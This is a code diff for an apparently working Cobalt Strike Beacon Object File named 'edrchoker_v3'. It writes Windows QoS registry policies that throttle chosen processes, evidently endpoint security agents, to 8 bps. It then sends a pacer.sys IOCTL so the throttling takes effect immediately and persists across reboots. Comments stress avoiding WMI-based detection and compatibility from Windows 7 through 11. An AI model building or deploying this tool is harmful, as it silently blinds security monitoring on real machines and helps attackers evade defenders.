@@ -1,25 +1,48 @@
 /*
  * edrchoker_v3.bof.c — Beacon Object File
  *
- * v3: No WMI, no COM. Pure registry via ADVAPI32.
- * Writes Group Policy QoS entries to:
- *   HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS\<name>
+ * v3: No WMI, no COM. Pure registry + direct pacer.sys trigger.
  *
- * pacer.sys reads this key on boot and on Group Policy refresh.
- * Policy is NOT immediately active — activate via:
- *   shell gpupdate /force
- *   OR reboot the target
- *   OR: shell net stop NetQosSvc & net start NetQosSvc
+ * MECHANISM
+ * ---------
+ * 1. Write QoS policy to registry (v1.0 format — what pacer.sys reads):
+ *      HKLM\SOFTWARE\Policies\Microsoft\Windows\QoS\<random>\
+ *        Version          REG_SZ  "1.0"
+ *        Application Name REG_SZ  "process.exe"
+ *        Protocol         REG_SZ  "*"
+ *        Local Port       REG_SZ  "*"
+ *        Local IP         REG_SZ  "*"
+ *        Remote Port      REG_SZ  "*"
+ *        Remote IP        REG_SZ  "*"
+ *        DSCP Value       REG_SZ  "-1"
+ *        Throttle Rate    REG_SZ  "8"   (8 bps — effectively zero)
  *
- * v2 (WMI) vs v3 (registry):
- *   v2: immediate effect, uses COM/WMI (detectable via WMI provider events)
- *   v3: requires reboot/gpupdate, no COM/WMI (only ADVAPI32 registry writes)
+ * 2. Send IOCTL 0x00128050 (PcpIoctlZawEvent) to \\.\PSCHED:
+ *    pacer.sys re-reads its registry config and enforces immediately.
+ *    No gpupdate, no reboot, no WMI needed.
+ *
+ * WHY v1.0 (not v2.0):
+ *   v1.0 (Application Name, Throttle Rate as REG_SZ) is read by pacer.sys.
+ *   v2.0 (AppName, ThrottleRate as QWORD) is read by eqos.sys — a separate
+ *   driver not present on consumer Windows. Using v2.0 with pacer.sys does
+ *   nothing; using v2.0 with gpupdate fails ("Enterprise QoS" error).
+ *
+ * WIN7 COMPATIBILITY
+ *   Works on Windows 7 through Windows 11 — pacer.sys and IOCTL 0x128050
+ *   (PcpIoctlZawEvent / ZAW event) have existed since NT 4.0.
+ *   edrchoker_v2 (WMI MSFT_NetQosPolicySettingData) fails on Win 7 because
+ *   that WMI class did not exist before Windows 8 / Server 2012.
+ *   v3 has no WMI dependency and works on both.
+ *
+ * PERSISTENCE
+ *   Policy survives reboot — registry key is NON_VOLATILE and pacer.sys
+ *   reads it on driver load.
  *
  * MODES
- *   add        — write policy entries to registry
- *   remove     — delete policies matching given process list
- *   remove_all — delete all QoS policies under the QoS key
- *   list       — enumerate policies
+ *   add        — write policy + trigger pacer.sys
+ *   remove     — delete matching policies + trigger pacer.sys
+ *   remove_all — delete all edrchoker_ policies + trigger pacer.sys
+ *   list       — enumerate active edrchoker_ policies
  *
  * COMPILE AS C, NOT C++
  *   mingw64: x86_64-w64-mingw32-gcc -O2 -o edrchoker_v3.x64.o -c edrchoker_v3.bof.c -masm=intel
@@ -46,10 +69,17 @@ DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetTickCount(void);
 DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
 DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
 DECLSPEC_IMPORT void*  WINAPI KERNEL32$RtlMoveMemory(void*, const void*, SIZE_T);
+DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DeviceIoControl(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
 
 /* ─── Constants ──────────────────────────────────────────────────────────── */
 static const wchar_t g_QosBase[] =
     L"SOFTWARE\\Policies\\Microsoft\\Windows\\QoS\\";
+
+/* IOCTL_PSCHED_ZAW_EVENT — signals pacer.sys to re-read registry policies.
+ * CTL_CODE(FILE_DEVICE_NETWORK=0x12, 0x14, METHOD_BUFFERED, FILE_ANY_ACCESS) */
+#define IOCTL_PSCHED_ZAW_EVENT  0x00128050
 
 static DWORD g_randS = 0;
 
@@ -71,7 +101,6 @@ static int WAppend(wchar_t* dst, int pos, int max, const wchar_t* src) {
     return pos;
 }
 
-/* Check if needle is one of the semicolon-separated tokens in list */
 static BOOL InList(const wchar_t* list, const wchar_t* needle) {
     const wchar_t* p = list;
     while (*p) {
@@ -83,7 +112,8 @@ static BOOL InList(const wchar_t* list, const wchar_t* needle) {
         int nLen = 0; while (needle[nLen]) nLen++;
         if (segLen == nLen) {
             int eq = 1;
-            for (int i = 0; i < segLen; i++) {
+            int i;
+            for (i = 0; i < segLen; i++) {
                 if (start[i] != needle[i]) { eq = 0; break; }
             }
             if (eq) return TRUE;
@@ -96,7 +126,8 @@ static void RandName(wchar_t* out, int n) {
     static const wchar_t pool[] =
         L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
     if (!g_randS) g_randS = KERNEL32$GetTickCount() | 1;
-    for (int i = 0; i < n; i++) {
+    int i;
+    for (i = 0; i < n; i++) {
         g_randS = g_randS * 1664525u + 1013904223u;
         out[i] = pool[(g_randS >> 16) % 62];
     }
@@ -112,12 +143,44 @@ static BOOL SetRegStr(HKEY hKey, const wchar_t* name, const wchar_t* val) {
         (const BYTE*)val, sz) == ERROR_SUCCESS;
 }
 
+/* ─── pacer.sys trigger ──────────────────────────────────────────────────── */
+
+/* Send PcpIoctlZawEvent (0x128050) to \\.\PSCHED.
+ * pacer.sys re-reads HKLM\...\QoS\ and applies all policies immediately.
+ * Discovered by reversing gptext.dll!ProcessPSCHEDPolicy (ordinal 3):
+ * the entire Group Policy QoS CSE reduces to exactly these three calls. */
+static void TriggerPsched(void) {
+    HANDLE h = KERNEL32$CreateFileW(
+        L"\\\\.\\PSCHED",
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL, OPEN_EXISTING,
+        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+        NULL);
+    if (h == INVALID_HANDLE_VALUE) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "  [!] PSCHED open failed — Psched not running?\n");
+        return;
+    }
+    DWORD br = 0;
+    BOOL ok = KERNEL32$DeviceIoControl(
+        h, IOCTL_PSCHED_ZAW_EVENT,
+        NULL, 0, NULL, 0, &br, NULL);
+    KERNEL32$CloseHandle(h);
+    if (ok) {
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "  [*] pacer.sys triggered (ZAW event) — policy active now\n");
+    } else {
+        BeaconPrintf(CALLBACK_ERROR,
+            "  [!] ZAW IOCTL failed — policy written but not yet active\n");
+    }
+}
+
 /* ─── QoS policy operations ──────────────────────────────────────────────── */
 
 static BOOL CreateQosPolicy(const wchar_t* proc) {
     wchar_t name[9]; RandName(name, 8);
 
-    /* Build full subkey path: base + random name */
     wchar_t path[128];
     int p = WAppend(path, 0, 128, g_QosBase);
     p = WAppend(path, p, 128, name);
@@ -134,15 +197,17 @@ static BOOL CreateQosPolicy(const wchar_t* proc) {
         return FALSE;
     }
 
+    /* v1.0 format — read by pacer.sys on receiving IOCTL 0x128050.
+     * v2.0 format (AppName QWORD) is for eqos.sys, not pacer.sys. */
     BOOL ok = TRUE;
     ok &= SetRegStr(hKey, L"Version",          L"1.0");
-    ok &= SetRegStr(hKey, L"Protocol",         L"TCP");
     ok &= SetRegStr(hKey, L"Application Name", proc);
+    ok &= SetRegStr(hKey, L"Protocol",         L"*");
     ok &= SetRegStr(hKey, L"Local Port",       L"*");
     ok &= SetRegStr(hKey, L"Local IP",         L"*");
     ok &= SetRegStr(hKey, L"Remote Port",      L"*");
     ok &= SetRegStr(hKey, L"Remote IP",        L"*");
-    ok &= SetRegStr(hKey, L"DSCP Value",       L"*");
+    ok &= SetRegStr(hKey, L"DSCP Value",       L"-1");
     ok &= SetRegStr(hKey, L"Throttle Rate",    L"8");
 
     ADVAPI32$RegCloseKey(hKey);
@@ -156,23 +221,18 @@ static BOOL CreateQosPolicy(const wchar_t* proc) {
     return ok;
 }
 
-/*
- * Delete QoS policies from registry.
- * matchList != NULL: only delete policies whose "Application Name" is in the list.
- * matchList == NULL: delete all policies under the QoS key.
- * Returns number of policies deleted.
- */
 static int DeleteQosPolicies(const wchar_t* matchList) {
     HKEY hParent = NULL;
+    /* KEY_SET_VALUE required: RegDeleteKeyW needs write access on the parent
+     * to delete child keys (without it returns ERROR_ACCESS_DENIED). */
     LONG rc = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE,
         L"SOFTWARE\\Policies\\Microsoft\\Windows\\QoS",
-        0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &hParent);
+        0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_SET_VALUE, &hParent);
     if (rc != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "  [-] QoS registry key not found\n");
         return 0;
     }
 
-    /* Collect all subkey names first (up to 64), then delete */
     const int MAX_KEYS = 64;
     const int NAME_LEN = 256;
     wchar_t* namesBuf = (wchar_t*)KERNEL32$VirtualAlloc(
@@ -184,7 +244,8 @@ static int DeleteQosPolicies(const wchar_t* matchList) {
     }
 
     int nNames = 0;
-    for (DWORD idx = 0; nNames < MAX_KEYS; idx++) {
+    DWORD idx;
+    for (idx = 0; nNames < MAX_KEYS; idx++) {
         DWORD subLen = NAME_LEN;
         if (ADVAPI32$RegEnumKeyExW(hParent, idx, namesBuf + nNames * NAME_LEN,
             &subLen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
@@ -193,10 +254,10 @@ static int DeleteQosPolicies(const wchar_t* matchList) {
     }
 
     int n = 0;
-    for (int i = 0; i < nNames; i++) {
+    int i;
+    for (i = 0; i < nNames; i++) {
         wchar_t* sub = namesBuf + i * NAME_LEN;
 
-        /* Read "Application Name" and optionally "Throttle Rate" */
         wchar_t appName[128];
         BOOL hasApp = FALSE;
         BOOL isMine = TRUE;
@@ -220,13 +281,11 @@ static int DeleteQosPolicies(const wchar_t* matchList) {
             ADVAPI32$RegCloseKey(hSub);
         }
 
-        /* Skip if matchList given and this policy's app is not in list */
         if (matchList != NULL) {
             if (!hasApp || !InList(matchList, appName))
                 continue;
         }
 
-        /* For remove_all: skip policies not created by us */
         if (matchList == NULL && !isMine) continue;
 
         if (ADVAPI32$RegDeleteKeyW(hParent, sub) == ERROR_SUCCESS) {
@@ -254,7 +313,8 @@ static void ListQosPolicies(void) {
     }
 
     int n = 0;
-    for (DWORD idx = 0; ; idx++) {
+    DWORD idx;
+    for (idx = 0; ; idx++) {
         wchar_t sub[256];
         DWORD subLen = 256;
         if (ADVAPI32$RegEnumKeyExW(hParent, idx, sub, &subLen,
@@ -298,14 +358,6 @@ static void ListQosPolicies(void) {
 }
 
 /* ─── Entry point ────────────────────────────────────────────────────────── */
-/*
- * Args packed by CNA:  bof_pack($bid, "zz", cmd, process_list)
- *
- * "add"        → mode 0: write registry QoS policy entries
- * "remove"     → mode 1: remove policies for listed processes
- * "remove_all" → mode 2: remove all QoS policies
- * "list"       → mode 3: enumerate policies
- */
 void go(char* args, int len) {
     datap parser;
     BeaconDataParse(&parser, args, len);
@@ -323,8 +375,6 @@ void go(char* args, int len) {
     }
     cmd[ci] = L'\0';
 
-    /* "add"        → 0  "remove" → 1
-     * "remove_all" → 2  "list"   → 3  */
     LONG mode = 0;
     if (cmd[0] == L'r' && cmd[6] == L'\0') mode = 1;
     if (cmd[0] == L'r' && cmd[6] == L'_')  mode = 2;
@@ -341,11 +391,12 @@ void go(char* args, int len) {
     if (argA && argN > 1) {
         int n = argN - 1;
         if (n >= PLEN) n = PLEN - 1;
-        for (int i = 0; i < n; i++)
+        int i;
+        for (i = 0; i < n; i++)
             buf[i] = (wchar_t)(unsigned char)argA[i];
     }
 
-    /* ── MODE 0: write registry entries ─────────────────────────────────── */
+    /* ── MODE 0: write registry + trigger pacer.sys ──────────────────────── */
     if (mode == 0) {
         if (!buf[0]) {
             BeaconPrintf(CALLBACK_ERROR,
@@ -369,8 +420,7 @@ void go(char* args, int len) {
         if (ok > 0) { cbT = CALLBACK_OUTPUT; } else { cbT = CALLBACK_ERROR; }
         BeaconPrintf(cbT, "[edrchoker_v3] %d policy(s) created, %d failed\n", ok, fail);
         if (ok > 0) {
-            BeaconPrintf(CALLBACK_OUTPUT,
-                "[!] Activate: shell gpupdate /force  OR  reboot\n");
+            TriggerPsched();
         }
 
     /* ── MODE 1: remove specific ─────────────────────────────────────────── */
@@ -384,12 +434,14 @@ void go(char* args, int len) {
         int cbT;
         if (n > 0) { cbT = CALLBACK_OUTPUT; } else { cbT = CALLBACK_ERROR; }
         BeaconPrintf(cbT, "[edrchoker_v3] %d policy(s) removed\n", n);
+        if (n > 0) { TriggerPsched(); }
 
     /* ── MODE 2: remove all ──────────────────────────────────────────────── */
     } else if (mode == 2) {
         int n = DeleteQosPolicies(NULL);
         BeaconPrintf(CALLBACK_OUTPUT,
             "[edrchoker_v3] %d QoS policy(s) removed\n", n);
+        if (n > 0) { TriggerPsched(); }
 
     /* ── MODE 3: list ────────────────────────────────────────────────────── */
     } else {
